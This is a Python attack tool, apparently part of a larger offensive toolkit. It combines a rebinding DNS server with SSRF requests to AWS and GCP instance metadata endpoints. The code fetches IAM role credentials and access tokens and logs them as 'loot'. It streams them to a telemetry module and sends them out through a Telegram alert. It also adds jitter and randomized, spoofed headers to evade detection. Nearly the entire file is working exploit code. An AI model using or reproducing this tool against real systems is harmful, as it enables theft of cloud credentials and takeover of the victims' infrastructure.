#!/usr/bin/env python3
"""
DNS_REBINDING.PY v8.7 — DNS Rebinding & Cloud Metadata SSRF Engine
"""
import asyncio
import hashlib
import socket
import struct
import sys
import threading
from urllib.parse import urlparse

from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
from modules.loot_logger import save_session_loot
from modules.telegram_notifier import send_telegram_alert
from modules.telemetry import stream_proof
from modules.transport import SecureTransport

COLORS = {
    "RED": "\033[91m",
    "GREEN": "\033[92m",
    "YELLOW": "\033[93m",
    "CYAN": "\033[96m",
    "MAGENTA": "\033[95m",
    "RESET": "\033[0m",
    "BOLD": "\033[1m",
}

_background_tasks: set[asyncio.Task] = set()


def terminal(message, color=COLORS["RESET"]):
    sys.stdout.write(f"{color}{message}{COLORS['RESET']}\n")
    sys.stdout.flush()


async def broadcast_tg_alert_async(loot_type, details):
    try:
        await asyncio.wait_for(send_telegram_alert(loot_type, details), timeout=8)
    except Exception:
        pass


def broadcast_tg_alert_sync(loot_type, details):
    try:
        loop = asyncio.get_running_loop()
        if not loop.is_closed():
            task = loop.create_task(broadcast_tg_alert_async(loot_type, details))
            _background_tasks.add(task)
            task.add_done_callback(_background_tasks.discard)
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass


class AuthoritativeRebindServer(threading.Thread):
    """Authoritative UDP DNS responder with per-client query sequence tracking."""

    def __init__(
        self,
        domain_name="rebind.brutedog.local",
        external_ip="8.8.8.8",
        internal_ip="169.254.169.254",
        bind_ip="127.0.0.1",
        port=5353,
    ):
        super().__init__()
        self.domain_name = domain_name.lower().strip(".")
        self.external_ip = external_ip
        self.internal_ip = internal_ip
        self.bind_ip = bind_ip
        self.port = port
        self.client_states: dict[str, int] = {}
        self._lock = threading.Lock()
        self.running = True
        self.bound = False
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            self.sock.bind((self.bind_ip, self.port))
            self.bound = True
            terminal(f"[+] Authoritative DNS Rebind Server bound to {self.bind_ip}:{self.port}", COLORS["GREEN"])
        except Exception as exc:
            terminal(f"[-] DNS Rebind server bind error on {self.bind_ip}:{self.port}: {exc}", COLORS["RED"])

    def _parse_qname(self, data, offset):
        labels = []
        jumped = False
        original_offset = offset
        max_jumps = 10
        jumps = 0

        while offset < len(data):
            length = data[offset]
            if length == 0:
                offset += 1
                break
            if (length & 0xC0) == 0xC0:
                if jumps >= max_jumps or offset + 1 >= len(data):
                    break
                pointer = struct.unpack("!H", data[offset : offset + 2])[0] & 0x3FFF
                if not jumped:
                    original_offset = offset + 2
                offset = pointer
                jumped = True
                jumps += 1
                continue
            offset += 1
            if offset + length > len(data):
                break
            labels.append(data[offset : offset + length].decode("utf-8", errors="ignore"))
            offset += length

        next_offset = original_offset if jumped else offset
        return ".".join(labels), next_offset

    def run(self):
        if not self.bound:
            return
        while self.running:
            try:
                self.sock.settimeout(0.4)
                try:
                    data, addr = self.sock.recvfrom(512)
                except socket.timeout:
                    continue

                if len(data) < 12:
                    continue

                tx_id = data[:2]
                qdcount = struct.unpack("!H", data[4:6])[0]

                if qdcount > 0:
                    qname, qname_end = self._parse_qname(data, 12)
                    qname_lower = qname.lower().strip(".")

                    if qname_lower != self.domain_name and not qname_lower.endswith("." + self.domain_name):
                        continue

                    if qname_end + 4 <= len(data):
                        qtype, qclass = struct.unpack("!HH", data[qname_end : qname_end + 4])
                        if qtype != 1 or qclass != 1:
                            continue

                    client_ip = addr[0]
                    with self._lock:
                        self.client_states[client_ip] = self.client_states.get(client_ip, 0) + 1
                        query_seq = self.client_states[client_ip]

                    selected_ip = self.external_ip if query_seq == 1 else self.internal_ip
                    terminal(
                        f"[*] Rebind Query #{query_seq} for '{qname}' from {client_ip} -> {selected_ip}",
                        COLORS["CYAN"],
                    )

                    flags_resp = b"\x84\x00"
                    qdcount_bytes = b"\x00\x01"
                    ancount_bytes = b"\x00\x01"
                    nscount_bytes = b"\x00\x00"
                    arcount_bytes = b"\x00\x00"
                    question = data[12 : qname_end + 4]
                    ip_bytes = socket.inet_aton(selected_ip)
                    answer = b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x00\x00\x04" + ip_bytes

                    response = (
                        tx_id
                        + flags_resp
                        + qdcount_bytes
                        + ancount_bytes
                        + nscount_bytes
                        + arcount_bytes
                        + question
                        + answer
                    )
                    self.sock.sendto(response, addr)
            except Exception as exc:
                if self.running:
                    terminal(f"[-] DNS Rebind server loop error: {exc}", COLORS["RED"])

    def stop(self):
        self.running = False
        try:
            self.sock.close()
        except Exception:
            pass


class DNSRebindingOrchestrator:
    """Orchestrates DNS rebinding checks and metadata credential verification."""

    def __init__(self, target_url, internal_target_ip="169.254.169.254", dns_port=5353):
        self.target_url = target_url
        self.internal_target_ip = internal_target_ip
        self.dns_port = dns_port
        self.dns_server: AuthoritativeRebindServer | None = None

    def start_server(self, external_ip="8.8.8.8", bind_ip="127.0.0.1"):
        parsed = urlparse(self.target_url)
        domain = parsed.hostname or "rebind.brutedog.local"
        server = AuthoritativeRebindServer(
            domain_name=domain,
            external_ip=external_ip,
            internal_ip=self.internal_target_ip,
            bind_ip=bind_ip,
            port=self.dns_port,
        )
        if server.bound:
            server.daemon = True
            server.start()
            self.dns_server = server
            terminal(f"[+] Authoritative DNS Rebind Server active on {bind_ip}:{self.dns_port}", COLORS["GREEN"])
        else:
            server.stop()

    def stop_server(self):
        if self.dns_server:
            self.dns_server.stop()
            self.dns_server = None
            terminal("[*] DNS Rebind Server stopped.", COLORS["YELLOW"])

    def _secure_resolve(self, hostname, expected_tx_id=b"\x12\x34"):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1.5)
        try:
            flags = b"\x01\x00"
            qdcount = b"\x00\x01"
            question = (
                b"".join([bytes([len(p)]) + p.encode("utf-8", errors="ignore") for p in hostname.split(".") if p])
                + b"\x00\x00\x01\x00\x01"
            )
            packet = expected_tx_id + flags + qdcount + b"\x00\x00\x00\x00\x00\x00" + question

            sock.sendto(packet, ("127.0.0.1", self.dns_port))
            data, _ = sock.recvfrom(512)

            if len(data) < 12:
                raise ValueError("Truncated DNS response packet.")
            if data[:2] != expected_tx_id:
                raise ValueError("Transaction ID mismatch.")

            ancount = struct.unpack("!H", data[6:8])[0]
            if ancount == 0 or len(data) < 4:
                raise ValueError("Zero answers returned in DNS response.")

            return socket.inet_ntoa(data[-4:])
        except Exception as exc:
            raise ConnectionError(f"Secure resolution failed for {hostname}: {exc}")
        finally:
            sock.close()

    async def execute_rebinding_attack(self, transport_client):
        terminal(f"\n[***] EXECUTING DNS REBINDING & METADATA SSRF CHECK [{self.target_url}] [***]", COLORS["MAGENTA"])
        apply_behavioral_jitter()

        parsed = urlparse(self.target_url)
        hostname = parsed.hostname
        if not hostname:
            raise ValueError("Invalid target URL: Missing hostname.")

        findings = {
            "target": self.target_url,
            "rebinding_executed": False,
            "internal_target": self.internal_target_ip,
            "loot": [],
        }

        if not self.dns_server or not self.dns_server.bound:
            terminal("[-] Local authoritative rebind server is not active; skipping local rebind probe.", COLORS["YELLOW"])
            findings["status"] = "skipped_unbound_server"
            return findings

        try:
            ip_1 = await asyncio.to_thread(self._secure_resolve, hostname, b"\x11\x11")
            terminal(f"[+] Rebind Resolution #1 -> {ip_1}", COLORS["GREEN"])
        except Exception as err:
            terminal(f"[-] Phase 1 resolution failed: {err}", COLORS["YELLOW"])
            return findings

        try:
            ip_2 = await asyncio.to_thread(self._secure_resolve, hostname, b"\x22\x22")
            terminal(f"[+] Rebind Resolution #2 -> {ip_2}", COLORS["GREEN"])
        except Exception as err:
            terminal(f"[-] Phase 2 resolution failed: {err}", COLORS["YELLOW"])
            return findings

        findings["rebinding_executed"] = True
        original_host = getattr(transport_client, "host", None)

        try:
            transport_client.host = ip_2
            token = None

            if "169.254" in ip_2:
                try:
                    t_status, _, t_body = await asyncio.to_thread(
                        transport_client.request,
                        "PUT",
                        "/latest/api/token",
                        extra_headers={
                            "Host": hostname,
                            "X-aws-ec2-metadata-token-ttl-seconds": "21600",
                        },
                    )
                    if t_status == 200 and t_body and len(t_body.strip()) > 10:
                        token = t_body.strip()
                        terminal("[+] Acquired AWS IMDSv2 session token.", COLORS["GREEN"])
                except Exception:
                    pass

            paths_to_probe = [
                "/latest/meta-data/iam/security-credentials/",
                "/computeMetadata/v1/instance/service-accounts/default/token",
            ]

            for path in paths_to_probe:
                req_headers = {"Host": hostname, "X-Forwarded-For": "127.0.0.1"}
                req_headers.update(get_randomized_hints())
                if token:
                    req_headers["X-aws-ec2-metadata-token"] = token
                if "computeMetadata" in path:
                    req_headers["Metadata-Flavor"] = "Google"

                status, headers, body = await asyncio.to_thread(
                    transport_client.request,
                    "GET",
                    path,
                    extra_headers=req_headers,
                )
                body_str = body or ""

                if status == 200 and "security-credentials" in path and len(body_str.strip()) > 0:
                    role_name = body_str.strip().splitlines()[0]
                    role_path = f"/latest/meta-data/iam/security-credentials/{role_name}"
                    r_status, _, r_body = await asyncio.to_thread(
                        transport_client.request,
                        "GET",
                        role_path,
                        extra_headers=req_headers,
                    )
                    if r_status == 200 and r_body:
                        body_str = r_body

                is_valid_aws_creds = "AccessKeyId" in body_str and "SecretAccessKey" in body_str
                is_valid_gcp_token = "access_token" in body_str

                if status in (200, 201) and (is_valid_aws_creds or is_valid_gcp_token):
                    terminal(f"[***] CRITICAL: VERIFIED CLOUD METADATA CREDENTIALS [HTTP {status}] [***]", COLORS["RED"])
                    loot_hash = hashlib.sha256(body_str.encode("utf-8", errors="ignore")).hexdigest()
                    loot_data = {
                        "status": status,
                        "resolved_ip": ip_2,
                        "endpoint": path,
                        "integrity_hash": loot_hash,
                        "response_sample": body_str[:800],
                    }
                    findings["loot"].append(loot_data)
                    stream_proof(
                        "DNS_REBINDING_SSRF_SUCCESS",
                        self.target_url,
                        {"resolved_ip": ip_2, "path": path, "hash": loot_hash},
                        body_str[:300],
                        loot_data,
                    )
                    save_session_loot(
                        target=self.target_url,
                        endpoint="dns_rebinding",
                        finding_type="DNS_REBINDING_SSRF_SUCCESS",
                        status=status,
                        headers=headers if isinstance(headers, dict) else {},
                        body=body_str,
                        extra_loot=loot_data,
                    )
                    await broadcast_tg_alert_async("DNS Rebinding & Cloud Metadata SSRF Confirmed", loot_data)
                    break
        finally:
            if original_host is not None and hasattr(transport_client, "host"):
                transport_client.host = original_host

        return findings


async def run_dns_rebinding_attack(target_url):
    transport = SecureTransport(target_url)
    orchestrator = DNSRebindingOrchestrator(target_url)
    orchestrator.start_server()
    try:
        return await orchestrator.execute_rebinding_attack(transport)
    finally:
        orchestrator.stop_server()


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://rebind.brutedog.local"
    asyncio.run(run_dns_rebinding_attack(target))
